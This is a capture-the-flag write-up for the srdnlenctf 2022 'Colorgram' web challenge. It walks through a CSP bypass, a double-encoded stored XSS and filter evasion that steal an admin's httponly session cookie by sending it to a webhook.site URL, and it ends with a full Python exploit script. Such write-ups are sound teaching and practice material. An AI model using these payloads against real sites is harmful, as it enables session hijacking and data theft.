# srdnlenctf 2022

## Colorgram (X solves)

> I hope the colorblind community doesn't get offended by this chall...
>
> Website: [http://colorgram.challs.srdnlen.it](http://colorgram.challs.srdnlen.it)
>
> Author: @takenX10

### Solution

By checking the source code (db/init.sql), we can see that the flag is inside the database in the password field of the admin user.
Reading the source code we can also see that the flag gets inserted in the session cookie of the admin, and you can read it by just decoding the jwt cookie.
So naturally, the objective becomes to obtain the admin cookie, even though it is httponly.
By checking the source code (src/login.php), we can also see that **you can obtain the cookie by just making a POST request to /login.php while you are already logged in without sending any parameters**.
Now you need to make the admin do a POST request to login, then send the response to yourself -> so you need a really good XSS.
First of all, you can do an XSS on the description field, you need to bypass the CSP:

```ascii
Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; object-src 'none';
```

To do that, we can use an iframe with the srcdoc tag, like this:

```html
<iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
```

Now, in order to insert the payload inside our user description we also need to bypass the php filter

```php
function validate_description($desc){
    $maxlength = 32;
    $finalstring = "";
    // Cut the string at the maxlength character
    for($i = 0; $i < $maxlength; $i++){
        $finalstring = $finalstring . $desc[$i];
    }
    $finalstring = urldecode($finalstring);
    $finalstring = str_replace("<","&lt;",$finalstring);
    $finalstring = str_replace(">","&gt;",$finalstring);

    return $finalstring;
}
```

- First of all, the maxlength is too strict, so to bypass it you can just pass the description as an array (`description[]=`)
- Then, we can see that the query gets decoded once more inside the code, so to bypass the `<` and `>` filter you need to url encode the character 2 times ([cyberchef](<https://cyberchef.org/#recipe=URL_Encode(false)Find_/_Replace(%7B'option':'Regex','string':'%253C'%7D,'%2525253C',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%253E'%7D,'%2525253E',true,false,true,false)&input=PGlmcmFtZSBzcmNkb2M9JzxzY3JpcHQgc3JjPSJkYXRhOnRleHQvamF2YXNjcmlwdCxhbGVydCgxKSI%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4>))

```ascii
description[]=%25253Ciframe%20srcdoc='%25253Cscript%20src=%22data:text/javascript,alert(1)%22%25253E%25253C/script%25253E'%25253E%25253C/iframe%25253E
```

Now we can just make a POST to `http://challengeurl/login.php` and send the response to our webhook:

```html
<iframe
  srcdoc='<script src="data:text/javascript,fetch(`http://challengeurl/login.php`,{method:`POST`}).then(r=>r.text()).then(d=>location=`https://webhook.site/243cc977-cefe-4e31-ac1d-fa5ece996add?c=${d}`);"></script>'
></iframe>
```

And encode it with the same method as before, final payload for the description:

```ascii
description[]=%25253Ciframe%20srcdoc='%25253Cscript%20src=%22data:text/javascript,fetch(%60http://challengeurl/login.php%60,%7Bmethod:%60POST%60%7D).then(r=%25253Er.text()).then(d=%25253Elocation=%60https://webhook.site/243cc977-cefe-4e31-ac1d-fa5ece996add?c=$%7Bd%7D%60);%22%25253E%25253C/script%25253E'%25253E%25253C/iframe%25253E
```

Now we need to make the admin open our xss.
By checking the color parameter we can see it gets inserted without `"`, so we can just add a space and an onload tag to inject an xss inside the color page.
Now we need to bypass the filter:

```php
if(strlen($color) > 48){
    die('{"error":"color too long!"}');
}
if(preg_match('/[\x00-\x7E]/',$color)){
    if(preg_match('/(\[|\]|\$|\ |\n|\'|\"|\<|\>|\\|\x00|\t|\`|\{|\}|.*on.+=)/',$color)){
        die('{"error":"Invalid character found!"}');
    }
}
```

- %0C does the same thing of space
- we can make a string by casting a regex as a string (`(/account.php?name=sos/))`) instead of using `'` or `"`
- The final slash of the regex is inserted inside the parameter, so we need to call our account with a slash at the end
- To bypass the `on` filter, we can write `oN` or `On`
- With all this, we can make a window.open (shorter than `window.location` and does'n use `on`)

Final payload, barely inside the 48 characters limit:

```ascii
%250CoNload=window.open((/account.php?name=sos/))
```

The last thing to remember is that you should use the challenge url inside your fetch to make it work locally, but to make it work for the admin you should use the internal url `http://colorgram:80/`

Proof of concept below.

Flag: `srdnlen{N1ce_J0B_s0rry_f0r_th1s_X55_4nd_h77p0nly_bypass}`

### Exploit

```python
import requests

CHALLENGE_URL = "http://challengeurl"

# Insert your webhook here
WEBHOOK_URL = "https://webhook.site/7b0e414b-e360-4b7b-865f-4e628ce3307a"

# remember / at the end of the name
username = "sos/"
password = "SrdnlenBestTeam"
mail = "srdnlen@thebest"

# If false it will perform the registration for you, otherwise it will just log in
already_registered = False

# < and > will get url encoded 2 times, the payload will be sent as an array (description[]) automagically (line 36)
payload_description = """<iframe srcdoc='<script src="data:text/javascript,fetch(`http://colorgram-app/login.php`,{method:`POST`}).then(r=>r.text()).then(d=>location=`%s?c=${d}`);"></script>'></iframe>"""%WEBHOOK_URL

payload_color = f"%250CoNload=window.open((/account.php?name={username}))"

session = requests.session()

def register(username, password, email):
    url = f"{CHALLENGE_URL}/register.php"
    data = {"username": username, "email": email, "password": password, "description": "srdnlenisthebestctfteam"}
    return session.post(url, data=data, allow_redirects = False)

def login(username, password):
    url = f"{CHALLENGE_URL}/login.php"
    data = {"username": username, "password": password}
    return session.post(url, data=data, allow_redirects = False)

def change_description(username, new_description):
    url = f"{CHALLENGE_URL}/description.php?name={username}"
    data = {"description[]":new_description}
    # No data=data so that the description[] gets interpreted correctly
    return session.post(url, data, allow_redirects = False)

def report_color_to_admin(username, color):
    url = f"{CHALLENGE_URL}/report.php?name={username}"
    data = {"admin_request":color}
    return session.post(url, data=data, allow_redirects = False)

def main():
    global payload_description
    if(already_registered):
        print("Logging in...")
        print(login(username, password).text)
    else:
        print("Registering...")
        print(register(username, password, mail).text)

    # double url encode char and make list
    payload_description = payload_description.replace("<","%253C")
    payload_description = payload_description.replace(">","%253E")
    print("Changing description...")
    print(change_description(username, payload_description).text)
    print("Reporting color to admin...")
    print(report_color_to_admin(username, payload_color).text)
    print("Now check your webhook, get the jwt inside the request and decode it (https://jwt.io/)")

if __name__ == "__main__":
    main()
```
